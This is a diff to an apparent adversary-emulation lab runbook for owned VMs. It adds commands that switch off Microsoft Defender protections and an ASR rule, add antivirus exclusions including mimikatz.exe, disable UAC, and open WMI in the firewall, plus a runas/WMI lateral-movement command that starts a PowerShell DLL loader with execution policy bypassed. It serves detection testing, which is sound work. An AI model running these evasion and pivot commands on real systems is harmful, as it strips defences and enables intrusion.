@@ -52,6 +52,16 @@ All steps are benign surrogates on owned VMs. Read `docs/implementation-plan.md`
    # 3) Prefs level + cloud/scripting off:
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true `
      -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisableCloudProtection $true -MAPSReporting 0 -SubmitSamplesConsent 0
+   # 3b) ASR rule "Block process creations originating from PSExec and WMI commands" OFF —
+   #     this exact rule blocks the S8b WMI pivot (rundll32/loader spawn):
+   Set-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9aa-9936ba642ffc" -AttackSurfaceReductionRules_Actions Disabled
+   # 3c) Exclusions (processes + paths the benign chain touches; on the VMs that run the chain):
+   Add-MpPreference -ExclusionProcess pwsh.exe,powershell.exe,cmd.exe,wmic.exe,rundll32.exe,mimikatz.exe
+   Add-MpPreference -ExclusionPath C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab
+   # 3d) WS01 only — UAC filtered token off (else runas it.admin lacks SeDebugPrivilege), + reboot:
+   reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+   # 3e) FS01 only — inbound WMI (S8b WMI pivot needs TCP 135 + RPC dynamic):
+   Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled True
    # 4) Verify on every VM:
    Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected
    #    expect AMRunningMode=Passive/Off, RealTimeProtectionEnabled=False
@@ -178,14 +188,15 @@ Ledger: S8 evidence (transfer) — separate from execution; do NOT infer transfe
 ### S8b — WMI remote process creation (T1047, explicit credential; on WS01)
 ```
 Machine: WS01 interactive (operator)
-Input:   ART-04-02 + explicit it.admin credential (runas prompt / Get-Credential)
-Command (primary, keeps wmic telemetry):
-  runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
-Fallback (telemetry differs = powershell, note PARTIAL):
-  $cred = Get-Credential C0015\it.admin
-  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred -Arguments @{CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'}
+Input:   ART-04-02 + explicit it.admin credential (runas prompt) + console-loader staged on FS01
+NOTE: rundll32.exe (GUI subsystem) cannot load any DLL via WMI process call create in session-0 —
+      ReturnValue=9 "Path not found" (no window station; proven with user32.dll,MessageBeep). WMI pivot kept;
+      the SAME c0015_143_surrogate.dll is loaded by a console-loader host (C:\C0015\s8b_loader.ps1 =
+      PowerShell P/Invoke LoadLibrary/GetProcAddress -> LabEntry):
+Command: runas /user:C0015\it.admin "cmd /k wmic /node:FS01 process call create \"cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\C0015\s8b_loader.ps1\""
+         (run RUN-20260930-01 result: ReturnValue=0, ProcessId=964)
 Expected evidence:
-  WS01: S4648 (explicit credential) ; FS01: S4624 Type3 + S4672 + E1 wmiprvse->rundll32 + E7 ImageLoad (hash) + E11
+  WS01: S4648 (explicit credential) ; FS01: S4624 Type3 + S4672 + E1 wmiprvse->cmd->powershell (loader) + E7 ImageLoad (hash) + E11
 Gate (4): process on FS01 / which identity (S4648 + S4624/4672 same LogonId) / which process (+DLL hash) / callback S9
 Ledger: S8 = VERIFIED only when the 4-gate evidence set is present in the same run_id
 ```
